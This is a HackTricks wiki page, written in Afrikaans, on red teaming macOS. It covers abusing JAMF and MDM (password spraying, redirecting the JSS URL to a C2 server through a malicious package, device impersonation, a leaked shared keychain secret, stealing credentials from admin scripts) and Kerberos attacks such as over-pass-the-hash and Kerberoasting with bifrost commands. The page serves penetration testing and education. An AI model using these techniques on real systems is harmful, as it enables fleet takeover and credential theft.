# macOS Red Teaming

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### Kry 'n hacker se perspektief op jou webtoepassings, netwerk, en wolk

**Vind en rapporteer kritieke, exploiteerbare kwesbaarhede met werklike besigheidsimpak.** Gebruik ons 20+ pasgemaakte gereedskap om die aanvaloppervlak te karteer, vind sekuriteitskwessies wat jou toelaat om bevoegdhede te verhoog, en gebruik geoutomatiseerde eksploitte om noodsaaklike bewyse te versamel, wat jou harde werk in oortuigende verslae omskep.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Misbruik van MDMs

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

As jy daarin slaag om **administrateur akrediteer te kompromitteer** om toegang tot die bestuursplatform te verkry, kan jy **potensieel al die rekenaars kompromitteer** deur jou malware in die masjiene te versprei.

Vir red teaming in MacOS omgewings is dit hoogs aanbeveel om 'n bietjie begrip te hê van hoe die MDMs werk:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### Gebruik MDM as 'n C2

'n MDM sal toestemming hê om profiele te installeer, te vra of te verwyder, toepassings te installeer, plaaslike administrateur rekeninge te skep, firmware wagwoord in te stel, die FileVault sleutel te verander...

Om jou eie MDM te laat loop, moet jy **jou CSR deur 'n verskaffer laat teken** wat jy kan probeer om te kry met [**https://mdmcert.download/**](https://mdmcert.download/). En om jou eie MDM vir Apple toestelle te laat loop, kan jy [**MicroMDM**](https://github.com/micromdm/micromdm) gebruik.

Om egter 'n toepassing op 'n geregistreerde toestel te installeer, moet dit steeds deur 'n ontwikkelaar rekening geteken wees... egter, by MDM registrasie voeg die **toestel die SSL sertifikaat van die MDM as 'n vertroude CA** by, so jy kan nou enigiets teken.

Om die toestel in 'n MDM te registreer, moet jy 'n **`mobileconfig`** lêer as root installeer, wat via 'n **pkg** lêer afgelewer kan word (jy kan dit in zip komprimeer en wanneer dit van safari afgelaai word, sal dit uitgepak word).

**Mythic agent Orthrus** gebruik hierdie tegniek.

### Misbruik van JAMF PRO

JAMF kan **pasgemaakte skripte** (skripte wat deur die sysadmin ontwikkel is), **natuurlike payloads** (lokale rekening skepping, EFI wagwoord instel, lêer/proses monitering...) en **MDM** (toestel konfigurasies, toestel sertifikate...) uitvoer.

#### JAMF self-registrasie

Gaan na 'n bladsy soos `https://<company-name>.jamfcloud.com/enroll/` om te sien of hulle **self-registrasie geaktiveer** het. As hulle dit het, kan dit **om akrediteer vra**.

Jy kan die skrip [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) gebruik om 'n wagwoord spuit aanval uit te voer.

Boonop, nadat jy die regte akrediteer gevind het, kan jy in staat wees om ander gebruikersname met die volgende vorm te brute-force:

![](<../../.gitbook/assets/image (107).png>)

#### JAMF toestel Verifikasie

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

Die **`jamf`** binêre het die geheim bevat om die sleutelring te open wat op die tyd van die ontdekking **gedeel** was onder almal en dit was: **`jk23ucnq91jfu9aj`**.\
Boonop, jamf **bly** as 'n **LaunchDaemon** in **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### JAMF Toestel Oorname

Die **JSS** (Jamf Software Server) **URL** wat **`jamf`** sal gebruik, is geleë in **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Hierdie lêer bevat basies die URL:

{% code overflow="wrap" %}
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
{% endcode %}

So, 'n aanvaller kan 'n kwaadwillige pakket (`pkg`) laat val wat **hierdie lêer oorskryf** wanneer dit geïnstalleer word, wat die **URL na 'n Mythic C2 listener van 'n Typhon agent** stel om nou JAMF as C2 te kan misbruik.

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### JAMF Imitasie

Om die **kommunikasie** tussen 'n toestel en JMF te **imiteer**, benodig jy:

* Die **UUID** van die toestel: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* Die **JAMF sleutelhouer** van: `/Library/Application\ Support/Jamf/JAMF.keychain` wat die toestel sertifikaat bevat

Met hierdie inligting, **skep 'n VM** met die **gestole** Hardeware **UUID** en met **SIP gedeaktiveer**, plaas die **JAMF sleutelhouer,** **haak** die Jamf **agent** en steel sy inligting.

#### Geheimenisse steel

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Jy kan ook die ligging `/Library/Application Support/Jamf/tmp/` monitor vir die **aangepaste skripte** wat admins mag wil uitvoer via Jamf, aangesien hulle **hier geplaas, uitgevoer en verwyder** word. Hierdie skripte **kan akrediteer** bevat.

Echter, **akrediteer** kan deur hierdie skripte as **parameters** oorgedra word, so jy sal `ps aux | grep -i jamf` moet monitor (sonder om root te wees).

Die skrip [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) kan luister vir nuwe lêers wat bygevoeg word en nuwe proses argumente.

### macOS Afgeleë Toegang

En ook oor **MacOS** "spesiale" **netwerk** **protokolle**:

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## Aktiewe Gids

In sommige gevalle sal jy vind dat die **MacOS rekenaar aan 'n AD** gekoppel is. In hierdie scenario moet jy probeer om die aktiewe gids te **nommer** soos jy gewoond is. Vind 'n bietjie **hulp** in die volgende bladsye:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

'n **lokale MacOS hulpmiddel** wat jou ook kan help is `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Ook is daar 'n paar gereedskap voorberei vir MacOS om outomaties die AD te evalueer en met kerberos te speel:

* [**Machound**](https://github.com/XMCyber/MacHound): MacHound is 'n uitbreiding van die Bloodhound ouditgereedskap wat die versameling en opname van Active Directory verhoudings op MacOS gasheer toestelle moontlik maak.
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost is 'n Objective-C projek wat ontwerp is om met die Heimdal krb5 APIs op macOS te kommunikeer. Die doel van die projek is om beter sekuriteitstoetsing rondom Kerberos op macOS toestelle moontlik te maak deur gebruik te maak van inheemse APIs sonder om enige ander raamwerk of pakkette op die teiken te vereis.
* [**Orchard**](https://github.com/its-a-feature/Orchard): JavaScript for Automation (JXA) gereedskap om Active Directory evaluering te doen.

### Domein Inligting
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Users

Die drie tipes MacOS gebruikers is:

* **Plaaslike Gebruikers** — Bestuur deur die plaaslike OpenDirectory diens, hulle is nie op enige manier aan die Active Directory gekoppel nie.
* **Netwerk Gebruikers** — Vlugtige Active Directory gebruikers wat 'n verbinding met die DC bediener benodig om te autentiseer.
* **Mobiele Gebruikers** — Active Directory gebruikers met 'n plaaslike rugsteun vir hul akrediteer en lêers.

Die plaaslike inligting oor gebruikers en groepe word gestoor in die gids _/var/db/dslocal/nodes/Default._\
Byvoorbeeld, die inligting oor die gebruiker genaamd _mark_ word gestoor in _/var/db/dslocal/nodes/Default/users/mark.plist_ en die inligting oor die groep _admin_ is in _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Benewens die gebruik van die HasSession en AdminTo kante, **voeg MacHound drie nuwe kante** by die Bloodhound databasis:

* **CanSSH** - entiteit toegelaat om SSH na gasheer
* **CanVNC** - entiteit toegelaat om VNC na gasheer
* **CanAE** - entiteit toegelaat om AppleEvent skripte op gasheer uit te voer
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Meer inligting in [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ wagwoord

Kry wagwoorde met:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Dit is moontlik om die **`Computer$`** wagwoord binne die Stelsel sleutelhouer te verkry.

### Over-Pass-The-Hash

Kry 'n TGT vir 'n spesifieke gebruiker en diens:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Sodra die TGT versamel is, is dit moontlik om dit in die huidige sessie in te spuit met:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Met verkregen dienskaartjies is dit moontlik om te probeer om toegang te verkry tot gedeeltes op ander rekenaars:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Toegang tot die Sleutelkettie

Die Sleutelkettie bevat hoogs waarskynlik sensitiewe inligting wat, indien toegang verkry word sonder om 'n prompt te genereer, kan help om 'n rooi span oefening vorentoe te beweeg:

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## Eksterne Dienste

MacOS Rooi Spanwerk is anders as 'n gewone Windows Rooi Spanwerk aangesien **MacOS gewoonlik direk met verskeie eksterne platforms geïntegreer is**. 'n Algemene konfigurasie van MacOS is om toegang tot die rekenaar te verkry met **OneLogin gesinkroniseerde akrediteer, en toegang tot verskeie eksterne dienste** (soos github, aws...) via OneLogin.

## Verskeie Rooi Span tegnieke

### Safari

Wanneer 'n lêer in Safari afgelaai word, as dit 'n "veilige" lêer is, sal dit **outomaties geopen** word. So byvoorbeeld, as jy **'n zip aflaai**, sal dit outomaties uitgepak word:

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## Verwysings

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### Kry 'n hacker se perspektief op jou webtoepassings, netwerk, en wolk

**Vind en rapporteer kritieke, uitbuitbare kwesbaarhede met werklike besigheidsimpak.** Gebruik ons 20+ pasgemaakte gereedskap om die aanvaloppervlak te karteer, vind sekuriteitskwessies wat jou toelaat om voorregte te verhoog, en gebruik outomatiese uitbuitings om noodsaaklike bewyse te versamel, wat jou harde werk in oortuigende verslae omskep.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
